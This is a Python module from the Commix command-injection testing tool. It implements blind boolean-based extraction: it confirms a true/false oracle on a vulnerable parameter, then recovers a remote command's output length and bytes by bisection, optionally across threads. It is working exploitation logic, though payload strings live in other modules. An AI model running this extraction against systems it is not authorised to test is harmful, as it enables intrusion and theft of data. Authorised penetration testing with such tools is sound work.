#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

import threading

from src.utils import settings
from src.utils import progress
from src.core.parse import cmdline as menu
from src.core.controller import checks
from src.core.techniques.boolean_based import bb_injector as injector

try:
  import concurrent.futures
  _THREADS_SUPPORTED = True
except ImportError:
  # "concurrent.futures" needs Python 3.2+; fall back to serial on Python 2.
  _THREADS_SUPPORTED = False

"""
Everything this technique needs to ask a question, kept together so the bisection below reads as the
search it is rather than as an argument list.
"""
class Channel(object):
  def __init__(self, separator, prefix, suffix, whitespace, http_request_method, url, vuln_parameter):
    self.separator = separator
    self.prefix = prefix
    self.suffix = suffix
    self.whitespace = whitespace
    self.http_request_method = http_request_method
    self.url = url
    self.vuln_parameter = vuln_parameter

  def ask(self, payload):
    return injector.ask(payload, self.prefix, self.suffix, self.whitespace,
                        self.http_request_method, self.url, self.vuln_parameter)

"""
Whether the target answers a question it was never asked before differently from one it was.

Two questions with known answers, and the page has to tell them apart - otherwise what is being read
is not an answer at all, and everything bisected on it would be noise.
"""
def confirm(channel):
  payloads = checks.boolean_based_payloads()
  holds = channel.ask(payloads.condition_check(channel.separator, holds=True))
  fails = channel.ask(payloads.condition_check(channel.separator, holds=False))
  if holds is None or fails is None:
    return False
  return holds is True and fails is False

"""
One question, asked again once before being given up on - a page that reads as neither true nor
false is more often a transient hiccup, concurrent requests contending for the same target resource
especially, than a real absence of an answer. The same payload both times, not a freshly-built one:
rebuilding it would count as a second step to a caller that renders one dot per step, and this is
still the one step retrying.
"""
def _ask(channel, payload):
  answer = channel.ask(payload)
  if answer is None:
    answer = channel.ask(payload)
  return answer

"""
The largest N the answer is still yes for, found by halving rather than by counting.
"""
def _bisect(channel, question, low, high):
  found = None
  while low <= high:
    middle = (low + high) // 2
    answer = _ask(channel, question(middle))
    if answer is None:
      return None
    if answer:
      found = middle
      low = middle + 1
    else:
      high = middle - 1
  return found

"""
How many bytes the command's output is.

Bracketed by doubling first, rather than bisecting the whole of '--maxlen' outright: a short output
is then found in about as many questions as its own length takes to double past, not in however many
the ceiling itself would need, and what the search costs reads as the answer's own size instead of a
constant no output's length would ever explain.
"""
def output_length(channel, cmd, ceiling=None, payloads=None):
  ceiling = int(ceiling or settings.MAXLEN)
  payloads = payloads or checks.boolean_based_payloads()
  info_msg = "Retrieving the length of execution output"
  info_msg += "." if settings.VERBOSITY_LEVEL != 0 else ", please wait..."
  settings.print_data_to_stdout(settings.END_LINE.CR + settings.print_info_msg(info_msg))
  # A dot per question, the way the techniques that wait for their answer mark theirs off.
  def question(candidate):
    asked = payloads.get_length(channel.separator, cmd, candidate, operator="-ge")
    if settings.VERBOSITY_LEVEL == 0:
      settings.print_data_to_stdout(".")
    return asked
  low, high = 0, 1
  while high < ceiling:
    answer = _ask(channel, question(high))
    if answer is None:
      return ""
    if not answer:
      break
    low = high
    high *= 2
  else:
    high = ceiling
  length = _bisect(channel, question, low, high)
  if length and settings.VERBOSITY_LEVEL == 0:
    settings.print_data_to_stdout(" (done)")
  if length and length > 1:
    settings.print_data_to_stdout(settings.print_info_msg("Retrieved: " + str(length)))
  return length

"""
One byte of the output, found by bisecting its ordinal.
"""
def _byte_at(channel, cmd, position, payloads=None):
  payloads = payloads or checks.boolean_based_payloads()
  question = lambda candidate: payloads.get_char(channel.separator, cmd, position, candidate, operator="-le")
  return _bisect(channel, question, min(settings.CHAR_POOL_MULTI), max(settings.CHAR_POOL_MULTI))

"""
The command's output, one byte at a time, each found by bisecting its ordinal.

Nothing is waited for and nothing is written anywhere: every byte costs the questions it takes to
halve the range it sits in, which is what makes this the cheapest of the blind channels.

Where the run was given threads, the bytes are read at the same time as one another. Each byte's
own search is a sequence - a half answered before the next is asked - but no byte's search depends
on another's, and nothing here is being timed, so requests that overlap cost the answer nothing.
That is what the time-related techniques cannot do: for them, overlapping requests are the
measurement.
"""
def retrieve(channel, cmd, length=None, payloads=None):
  workers = settings.THREADS if (settings.THREADS > 1 and _THREADS_SUPPORTED) else 1
  # Said before either un-timed phase below spends a request - the length search included, not
  # only the byte-by-byte one - since only there is it still useful advice.
  if workers == 1 and not settings.BOOLEAN_THREADS_SUGGESTED:
    settings.BOOLEAN_THREADS_SUGGESTED = True
    info_msg = "Nothing here is timed, so '--threads' asks for several bytes at once without costing accuracy."
    settings.print_data_to_stdout(settings.print_info_msg(info_msg))
  length = output_length(channel, cmd, payloads=payloads) if length is None else length
  if not length:
    return ""
  positions = list(range(1, length + 1))
  base = "Retrieving the execution output"
  resolved, lock = {}, threading.Lock()
  eta_bar = progress.ProgressBar(maxvalue=length) if menu.options.eta else None
  if eta_bar is None and length > 1:
    settings.print_data_to_stdout(settings.END_LINE.CR + settings.print_info_msg(base + ": "))

  # Assembled in position order once retrying is done - a position that stayed unresolved is marked
  # rather than dropped, the same way the time-related techniques mark theirs: a silently shorter
  # output is indistinguishable from a real value.
  def _so_far():
    out = ""
    for position in positions:
      ascii_char = resolved.get(position)
      if position not in resolved:
        break
      out += settings.UNRESOLVED_CHAR if ascii_char is None else chr(ascii_char)
    return out

  # Rendered the way the time-related techniques render theirs, and for the same reasons: a byte not
  # asked for yet is "_", one that could not be read is marked, a character that cannot be shown as
  # itself becomes a space, and only the tail of a long output is kept - a line that is rewritten in
  # place has to stay on one line, which a newline or an overlong output would take it off.
  def _display():
    chars, furthest = [], 0
    for index, position in enumerate(positions, 1):
      if position not in resolved:
        chars.append("_")
        continue
      ascii_char = resolved[position]
      if ascii_char is None:
        chars.append(settings.UNRESOLVED_CHAR)
      else:
        char = chr(ascii_char)
        chars.append(char if char.isprintable() else settings.SINGLE_WHITESPACE)
      furthest = index
    return checks.progress_display_text(chars, furthest, length)

  def _note():
    with lock:
      if eta_bar is not None:
        eta_bar.progress(sum(1 for position in positions if resolved.get(position) is not None))
      else:
        settings.print_data_to_stdout(settings.END_LINE.CR + settings.print_info_msg(base + ": " + _display()))

  def _resolve(position):
    resolved[position] = _byte_at(channel, cmd, position, payloads=payloads)
    _note()

  if workers == 1:
    for position in positions:
      _resolve(position)
  else:
    with concurrent.futures.ThreadPoolExecutor(max_workers=min(workers, length)) as executor:
      list(executor.map(_resolve, positions))

  # A position with no answer is usually a transient miss - a lagging response, or one worker's
  # request read as another's - so each one is asked again, alone, whether or not the first pass was
  # threaded. Every position failing is a systematic failure instead, and asking the same oracle
  # twice would only spend the requests again.
  failed_positions = [position for position in positions if resolved.get(position) is None]
  if failed_positions and len(failed_positions) < len(positions):
    info_msg = "Re-attempting " + str(len(failed_positions)) + " character"
    info_msg += "s"[len(failed_positions) == 1:] + " that returned no answer."
    settings.print_data_to_stdout(settings.print_info_msg(info_msg))
    if workers == 1:
      for position in failed_positions:
        _resolve(position)
    else:
      with concurrent.futures.ThreadPoolExecutor(max_workers=min(workers, len(failed_positions))) as executor:
        list(executor.map(_resolve, failed_positions))
    failed_positions = [position for position in failed_positions if resolved.get(position) is None]

  if failed_positions:
    settings.INCOMPLETE_OUTPUT = True
    warn_msg = str(len(failed_positions)) + " of " + str(len(positions)) + " character"
    warn_msg += "s"[len(positions) == 1:] + " could not be extracted (no answer was ever read for "
    warn_msg += ("them" if len(failed_positions) != 1 else "it") + ", on a second attempt either) - "
    warn_msg += ("they are" if len(failed_positions) != 1 else "it is") + " marked '"
    warn_msg += settings.UNRESOLVED_CHAR + "' in the retrieved output below."
    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))

  output = _so_far()
  if settings.VERBOSITY_LEVEL == 0:
    settings.close_progress_line()
  return output

"""
The exploitation function.
(call the injection handler)
"""
def exploitation(url, timesec, filename, http_request_method, injection_type, technique):
  from src.core.controller import handler
  return handler.do_boolean_based_process(url, timesec, filename, http_request_method, injection_type, technique)

# eof
